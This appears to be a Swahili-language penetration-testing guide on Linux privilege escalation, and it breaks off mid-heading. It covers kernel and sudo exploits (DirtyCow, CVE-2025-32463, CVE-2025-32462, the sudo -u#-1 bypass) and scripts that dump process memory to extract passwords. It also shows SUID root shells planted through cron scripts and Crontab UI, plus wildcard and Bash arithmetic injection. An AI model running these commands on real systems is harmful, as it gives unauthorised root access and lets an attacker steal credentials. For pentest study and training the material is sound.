# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Kwa maelezo ya jumla zaidi na workflows za kihistoria za enumeration, linganisha nyenzo za g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation, na linux-private-i zilizoorodheshwa kwenye marejeo.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata taarifa kuhusu OS inayoendesha.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

Ikiwa una **write permissions kwenye folda yoyote iliyo ndani ya variable ya `PATH`** unaweza kufanya hijack ya baadhi ya libraries au binaries:

```bash
echo $PATH
```

### Taarifa za mazingira

Je, kuna taarifa za kuvutia, nywila au API keys kwenye vigezo vya mazingira?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Angalia toleo la kernel na kama kuna exploit inayoweza kutumiwa kuongeza privileges.

Sehemu ya [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) hukusanya matukio ya local privilege escalation na viungo vya maelezo ya kina zaidi kuhusu Linux kernel katika Binary Exploitation. Hakikisha build na usanidi ulioathiriwa kabla ya kujaribu mfano.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Unaweza kupata orodha nzuri ya kernel zilizo katika hatari na baadhi ya **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Tovuti nyingine ambako unaweza kupata **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel zilizo katika hatari kutoka kwenye tovuti hiyo, unaweza kufanya hivi:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Zana zinazoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (iendeshe ndani ya victim, hukagua tu exploits za kernel 2.x)

Daima **tafuta toleo la kernel kwenye Google**; huenda toleo lako la kernel limeandikwa kwenye kernel exploit, na hivyo utahakikisha kuwa exploit hiyo inafanya kazi.

Mbinu za ziada za kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Toleo la Sudo

Kulingana na matoleo hatarishi ya sudo yanayoonekana katika:

```bash
searchsploit sudo
```

Unaweza kuangalia kama toleo la sudo lina udhaifu kwa kutumia grep hii.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Sudo ya upstream **1.9.14 hadi 1.9.17** huruhusu watumiaji wa ndani wasio na privileges kuongeza privileges hadi root kupitia chaguo la `--chroot` wakati sudo inapopakia `/etc/nsswitch.conf` kutoka kwenye directory inayodhibitiwa na mtumiaji; upstream ilirekebisha hili katika **1.9.17p1**. Kagua kila binary ya sudo inayoweza kutekelezwa yenye root-setuid katika paths husika, kwa kuwa `sudo -V` huripoti tu binary iliyochaguliwa na `PATH`. Packages za distribution zinaweza kuwa na backport ya marekebisho bila kubadilisha string ya upstream version, kwa hiyo thibitisha pia hali ya package ya vendor. Tazama [ushauri wa maintainer wa sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Hii hapa [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya kutumia [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) hiyo. Kabla ya kuendesha exploit, hakikisha kwamba toleo lako la `sudo` liko hatarini na linaunga mkono kipengele cha `chroot`.  

Kwa maelezo zaidi, rejelea [ushauri wa awali kuhusu vulnerability](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Kukwepa sheria za sudo zinazotegemea host (CVE-2025-32462)

Sudo ya upstream **1.8.8 hadi 1.9.17** inaweza kutathmini sheria za sudoers zinazotegemea host kwa kutumia **hostname iliyotolewa na mtumiaji** kupitia `sudo -h <host>` badala ya **hostname halisi**; upstream ilirekebisha hili katika **1.9.17p1**. Mtumiaji bado anahitaji kuwa na ingizo la sudoers linalolingana kwenye host iliyochaguliwa. Kagua backports za vendor na binary mbadala za sudo pamoja na policy ya ndani. Tazama [ushauri wa maintainer wa sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Mahitaji:
- Toleo la sudo lililo hatarini
- Sheria za sudoers maalum kwa host (host si hostname ya sasa wala `ALL`)

Mfano wa muundo wa sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit kwa spoofing host inayoruhusiwa:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Ikiwa utatuzi wa jina lililochaguliwa hauwezekani, thibitisha jinsi jina hilo linavyotatuliwa kwenye host. Kuona jina tu kwenye log au faili ya usanidi hakumaanishi kwamba linaweza kutatuliwa, na kubadilisha `/etc/hosts` kwa kawaida huhitaji ruhusa za juu za kuandika.

#### sudo < v1.8.28

Hii [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) inahitaji sheria ya sudo inayotumika kuruhusu amri kutekelezwa kama mtumiaji yeyote wa `ALL` isipokuwa root, kama vile `(ALL, !root) /bin/bash`. Mpigaji lazima pia aruhusiwe kutumia sheria hiyo, ikijumuisha sharti lolote la uthibitishaji. Angalia tangazo la usalama la kifurushi kilichosakinishwa: vendors walijumuisha marekebisho kwenye matoleo ambayo toleo lake la upstream linaloonyeshwa bado ni chini ya 1.8.28. Sheria ya `!root` au toleo la zamani pekee halithibitishi kuwa mfumo uko hatarini. Usijaribu amri yenye ruhusa za juu wakati wa enumeration tulivu.

```
sudo -u#-1 /bin/bash
```

### Uthibitishaji wa saini ya Dmesg umeshindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inavyoweza kutumiwa kwa exploit.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Uchunguzi zaidi wa mfumo

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Orodhesha ulinzi unaowezekana

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Ikiwa uko ndani ya container, anza na sehemu ifuatayo ya usalama wa container kisha uende kwenye kurasa za matumizi mabaya zinazohusu runtime mahususi:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Diski

Angalia **vitu vilivyomountiwa na vile ambavyo havijamountiwa**, vilipo na kwa nini. Ikiwa chochote hakijamountiwa, unaweza kujaribu kukimount na kuangalia kama kina taarifa za faragha.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Programu muhimu

Orodhesha binaries muhimu

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Pia, angalia kama **compiler yoyote imesakinishwa**. Hili ni muhimu ikiwa unahitaji kutumia kernel exploit, kwa kuwa inapendekezwa ku-compile kwenye mashine utakayoitumia (au kwenye mashine inayofanana).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Programu Zilizosakinishwa Zilizo Hatarini

Angalia **toleo la vifurushi na huduma zilizosakinishwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa vibaya ili kupata privilege escalation…\
Inapendekezwa kuangalia mwenyewe matoleo ya programu zilizosakinishwa zinazotia shaka zaidi.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Ikiwa una ufikiaji wa SSH kwenye mashine, unaweza pia kutumia **openVAS** kuangalia kama kuna programu zilizopitwa na wakati na zenye udhaifu zilizowekwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa kiasi kikubwa hazitakuwa na manufaa; kwa hiyo, inapendekezwa kutumia programu kama OpenVAS au zinazofanana nayo ili kuangalia kama toleo lolote la programu iliyowekwa lina udhaifu unaoweza kutumiwa na exploits zinazojulikana_

## Processes

Angalia **ni michakato gani** inayotekelezwa na uhakikishe kama kuna mchakato wowote wenye **ruhusa nyingi kuliko inavyopaswa** (labda Tomcat inatekelezwa na root?)

```bash
ps aux
ps -ef
top -n 1
```

Kagua kila mara [**electron/cef/chromium debuggers** zinazoendeshwa; unaweza kuzitumia vibaya ili kupata privileges za juu](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** huzitambua kwa kuangalia parameter ya `--inspect` kwenye command line ya process.\
Pia **kagua privileges zako kwenye binaries za processes**; huenda unaweza kubadilisha binary ya mtu mwingine.

### Minyororo ya parent-child kati ya watumiaji tofauti

Child process inayoendeshwa chini ya **mtumiaji tofauti** na parent wake si lazima iwe na nia ovu, lakini ni **ishara muhimu ya triage**. Baadhi ya mabadiliko hayo yanatarajiwa (`root` ikianzisha service user, au login managers zikiunda session processes), lakini minyororo isiyo ya kawaida inaweza kufichua wrappers, debug helpers, persistence, au mipaka dhaifu ya uaminifu wa runtime.

Ukaguzi wa haraka:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Ukikuta mnyororo wa matukio usiotarajiwa, kagua command line ya mchakato mzazi na faili zote zinazoathiri tabia yake (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Katika njia kadhaa halisi za privesc, mchakato mtoto wenyewe haukuweza kuandikwa, lakini **config inayodhibitiwa na mchakato mzazi** au mnyororo wa helper scripts uliweza.

### Executables zilizofutwa na faili zilizofunguliwa kisha kufutwa

Artifacts za wakati wa utekelezaji mara nyingi bado zinaweza kufikiwa **baada ya kufutwa**. Hili linafaa kwa privilege escalation na kurejesha ushahidi kutoka kwa mchakato ambao tayari una faili nyeti zilizofunguliwa.

Angalia executables zilizofutwa:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Ikiwa `/proc/<PID>/exe` inaelekeza kwa `(deleted)`, mchakato bado unaendesha binary image ya zamani kutoka kwenye kumbukumbu. Hii ni ishara muhimu ya kuchunguza kwa sababu:

- executable iliyoondolewa inaweza kuwa na strings au credentials zinazovutia
- mchakato unaoendelea unaweza bado kufichua file descriptors muhimu
- binary yenye privileged iliyoondolewa inaweza kuashiria tampering ya hivi karibuni au jaribio la kusafisha alama

Kusanya faili zilizo wazi lakini zimefutwa kwenye mfumo mzima:

```bash
lsof +L1
```

Ukipata descriptor ya kuvutia, irejeshe moja kwa moja:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Hili lina thamani hasa wakati process bado ina faili ya siri iliyofutwa, script, nakala ya database au faili ya flag ikiwa wazi.

### Ufuatiliaji wa process

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia process. Hii inaweza kuwa muhimu sana kutambua process zilizo hatarini zinazoendeshwa mara kwa mara au zinapoafikiwa seti fulani ya masharti.

#### Linux ProcMon chini ya sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) inaweza kufuatilia process na system call zilizochaguliwa na kuhifadhi trace ya SQLite. Ikiwa `sudo -l` inaruhusu kuendesha amri ya `procmon` yenye uwezo usiozuiliwa wa root, zingatia kama inaweza kufuatilia ingizo au matokeo ya process ya mtumiaji mwingine. Ruhusa hiyo ni kidokezo cha kuchunguza tu: uwezo wa tracer, sera inayotumika na shughuli za process inayofaa vyote ni muhimu. Faili za trace zinaweza kuwa na siri, kwa hiyo kagua exports zilizoidhinishwa kwa uangalifu na epuka kukusanya data za process zisizohusika.

### Kumbukumbu ya process

Baadhi ya huduma za server huhifadhi **credentials katika maandishi wazi ndani ya kumbukumbu**.\
Kwa kawaida utahitaji **haki za root** ili kusoma kumbukumbu ya process za watumiaji wengine, kwa hiyo hili huwa na manufaa zaidi ikiwa tayari una root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya process unazomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa chaguo-msingi**, jambo linalomaanisha kuwa huwezi kutupa kumbukumbu ya process nyingine zinazomilikiwa na mtumiaji wako asiye na upendeleo.
>
> Faili ya _**/proc/sys/kernel/yama/ptrace_scope**_ hudhibiti ufikikaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: process zote zinaweza kufanyiwa debugging, mradi tu zina uid sawa. Hii ndiyo njia ya kawaida ya jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: process ya mzazi pekee ndiyo inaweza kufanyiwa debugging.
> - **kernel.yama.ptrace_scope = 2**: admin pekee ndiye anayeweza kutumia ptrace, kwa kuwa inahitaji uwezo wa CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna process inayoweza kufuatiliwa kwa ptrace. Baada ya kuwekwa, kuwasha upya kunahitajika ili kuwezesha ptracing tena.

Process yenye UID sawa inayofungua vault ya password kwa muda mfupi inaweza kuwa mpaka tofauti wa credentials. Ufuatiliaji unaporuhusiwa, process inayoendeshwa na inayoweza kutupwa inaweza kufichua password ya vault kupitia input syscalls au kumbukumbu yake, hata kama faili ya vault iliyosimbwa bado imelindwa. `ptrace_scope=0` ni sharti moja tu: credentials zinazolingana, hali ya target ya kutupwa, Linux security modules nyingine na muda wa uhai wa process pia ni muhimu. Kuingia kwa vault kuwa login ya Unix root kunahitaji ukaguzi tofauti wa matumizi tena ya credentials. Uorodheshaji wa kawaida unapaswa kuripoti sera na process inayoweza kufaa au njia za vault, si kunasa input au kuonyesha siri. Tazama [nyaraka za Yama za kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) na [ukaguzi wa ufikiaji wa ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Ikiwa unaweza kufikia kumbukumbu ya huduma ya FTP (kwa mfano), unaweza kupata Heap na kutafuta credentials zake.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Skripti ya GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID ya mchakato fulani, **maps huonyesha jinsi kumbukumbu ilivyopangwa ndani ya nafasi ya anwani pepe ya mchakato huo**; pia huonyesha **ruhusa za kila eneo lililopangwa**. Faili bandia ya **mem** **hufichua kumbukumbu yenyewe ya michakato**. Kutoka kwenye faili ya **maps**, tunajua ni **maeneo gani ya kumbukumbu yanaweza kusomeka** na offsets zake. Tunatumia taarifa hii **kutafuta sehemu husika ndani ya faili ya mem na kutupa maeneo yote yanayoweza kusomeka** kwenye faili.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` hutoa ufikiaji wa kumbukumbu **halisi** ya mfumo, si kumbukumbu pepe. Nafasi ya anwani pepe ya kernel inaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa na **root** na kikundi cha **kmem** pekee.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump kwa Linux

ProcDump ni toleo la Linux lililoundwa upya la zana ya kawaida ya ProcDump kutoka kwenye mkusanyiko wa zana za Sysinternals za Windows. Ipate kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Zana

Ili kutupa kumbukumbu ya process, unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mwenyewe mahitaji ya root na kutupa process unayomiliki
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Vitambulisho kutoka Kumbukumbu ya Process

#### Mfano wa Mwongozo

Ukigundua kuwa process ya authenticator inaendeshwa:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Unaweza kudump process (angalia sehemu zilizotangulia ili kupata njia tofauti za kudump memory ya process) na kutafuta credentials ndani ya memory:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **itaiba vitambulisho vya maandishi wazi kutoka kwenye kumbukumbu** na kwenye baadhi ya **faili zinazojulikana sana**. Inahitaji ruhusa za root ili ifanye kazi ipasavyo.

| Kipengele                                         | Jina la Mchakato    |
| ------------------------------------------------- | -------------------- |
| Nenosiri la GDM (Kali Desktop, Debian Desktop)    | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Miunganisho hai ya FTP)                   | vsftpd               |
| Apache2 (Vipindi hai vya uthibitishaji wa HTTP Basic) | apache2           |
| OpenSSH (Vipindi hai vya SSH - Matumizi ya Sudo)  | sshd:                |

#### Regex za Utafutaji/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Kazi zilizopangwa/Cron

### Crontab UI (alseambusher) inayoendeshwa kama root – kupandisha mamlaka kupitia scheduler ya wavuti

Ikiwa paneli ya wavuti ya “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa kwenye loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda job yenye mamlaka ya juu ili kupandisha mamlaka.<sup>[[1]](#references)[[4]](#references)</sup>

Mtiririko wa kawaida
- Gundua port iliyofungwa kwa loopback pekee (k.m., 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials kwenye faili za uendeshaji:
  - Backups/scripts zilizo na `zip -P <password>`
  - systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tengeneza tunnel na uingie:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda kazi yenye marupurupu ya juu na uiendeshe mara moja (huunda SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
Itumie:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Usiendeshe Crontab UI kama root; tumia mtumiaji maalum na ruhusa za kiwango cha chini
- Funga kwenye localhost na uzuie ufikiaji zaidi kwa firewall/VPN; usitumie tena nywila
- Epuka kuweka siri ndani ya unit files; tumia secret stores au EnvironmentFile inayoweza kufikiwa na root pekee
- Washa ukaguzi/uwekaji wa kumbukumbu kwa utekelezaji wa kazi unaoanzishwa unapohitajika

Angalia kama kazi yoyote iliyopangwa iko hatarini. Labda unaweza kutumia vibaya script inayoendeshwa na root (wildcard vuln? unaweza kurekebisha faili ambazo root hutumia? kutumia symlinks? kuunda faili maalum kwenye saraka ambayo root hutumia?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Ikiwa `run-parts` inatumika, angalia ni majina yapi yatatekelezwa:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Hii huzuia matokeo chanya ya uwongo. Saraka ya muda inayoweza kuandikika ni muhimu tu ikiwa jina la faili la payload yako linalingana na sheria za `run-parts` za mfumo wa ndani.

### Njia ya Cron

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Ona kwamba mtumiaji "user" ana ruhusa za kuandika kwenye /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root atajaribu kutekeleza amri au script bila kuweka path. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata root shell kwa kutumia:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron ikitumia script yenye wildcard (Wildcard Injection)

Ikiwa script inaendeshwa na root na ina “**\***” ndani ya command, unaweza kutumia hili kusababisha mambo yasiyotarajiwa (kama privesc). Mfano:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Ikiwa wildcard imetanguliwa na njia kama** _**/some/path/\***_ **, haiwezi kudhulumiwa (hata** _**./\***_ **haiwezi).**

Soma ukurasa ufuatao kwa mbinu zaidi za kutumia wildcards:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection katika wachanganuzi wa kumbukumbu za cron

Bash arithmetic inaweza kutafsiri maandishi yasiyoaminika kama usemi. Katika miktadha fulani ya Bash, faharasa ya array ndani ya usemi huo inaweza kutathmini command substitution. Ikiwa cron/parser yenye mapendeleo itaweka maandishi ya kumbukumbu yanayodhibitiwa na mshambuliaji kwenye ulinganisho huo wa kihesabu, command substitution inaweza kutekelezwa kwa utambulisho wa parser.<sup>[[22]](#references)</sup> Hili hutegemea usemi halisi wa Bash na toleo lake; mfuatano wa `$(...)0` peke yake ndani ya kigezo kilichopanuliwa si kielelezo cha kuaminika kwamba tathmini itafanyika tena.

Ingizo linaweza pia kutoka kwenye metadata ya faili au sehemu nyingine inayosomwa kutoka eneo ambalo mtumiaji anaweza kuandikia. Kwa mfano, script yenye mapendeleo ya kusafisha faili inayosoma tagi ya picha ya `Producer` na kuilinganisha kwa kutumia `[[ "$producer" -eq "expected" ]]` hufanya ulinganisho wa kihesabu, ingawa kigezo kimewekwa ndani ya alama za kunukuu. Fuatilia utambulisho unaotumika kwa kazi iliyopangwa, faili zinazoweza kutoa tagi hiyo, mabadiliko yoyote yanayofanywa kabla ya ulinganisho, na tabia halisi ya Bash. Kwa lebo za maandishi, tumia ulinganisho wa string; kwa nambari, thibitisha kuwa ingizo lina tarakimu za desimali pekee kabla ya kufanya hesabu. Tazama [sheria za Bash arithmetic](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Muundo wa kawaida ulio katika hatari:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Uchunguzi salama wa tabia ya ndani ya utaratibu wa array-subscript (bila mchakato wenye haki za juu wala mabadiliko ya faili):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Fuatilia script halisi iliyopangwa kutekelezwa na njia halisi ya ingizo inayofunguliwa. Hata kama faili ya log yenyewe haiwezi kuandikika, mtumiaji anayeweza kuandika na kupita kwenye parent directory yake isiyo na sticky bit anaweza kubadilisha ingizo lake kwenye directory; `namei -l` husaidia kutofautisha ruhusa hizo. Njia tofauti ya log inayoweza kuandikika, scheduler isiyosomeka, au parser ambayo haitathmini sehemu hiyo kama hesabu ya Bash havithibitishi njia hii.

### Kuandika upya script ya Cron na symlink

Ikiwa **unaweza kurekebisha script ya cron** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Ikiwa script inayotekelezwa na root inatumia **directory ambayo una access kamili nayo**, huenda ikafaa kufuta folder hiyo na **kuunda folder ya symlink inayoelekeza kwenye nyingine** inayotoa script unayoidhibiti.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Uthibitishaji wa symlink na ushughulikiaji salama zaidi wa faili

Unapokagua scripts/binaries zenye ruhusa za juu zinazosoma au kuandika faili kwa kutumia njia, hakikisha jinsi links zinavyoshughulikiwa:

- `stat()` hufuata symlink na kurudisha metadata ya lengwa.
- `lstat()` hurudisha metadata ya link yenyewe.
- `readlink -f` na `namei -l` husaidia kutatua lengwa la mwisho na kuonyesha ruhusa za kila sehemu ya njia.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Kwa defenders/developers, njia salama zaidi za kuzuia mbinu za symlink ni pamoja na:

- `O_EXCL` pamoja na `O_CREAT`: hushindwa ikiwa njia tayari ipo (huzuia links/files ambazo mshambuliaji ameunda mapema).
- `openat()`: hufanya kazi ikilinganishwa na file descriptor ya directory inayoaminika.
- `mkstemp()`: huunda temporary files kwa njia ya atomiki na ruhusa salama.

### Binaries za cron zilizotiwa saini maalum zenye payloads zinazoweza kuandikwa
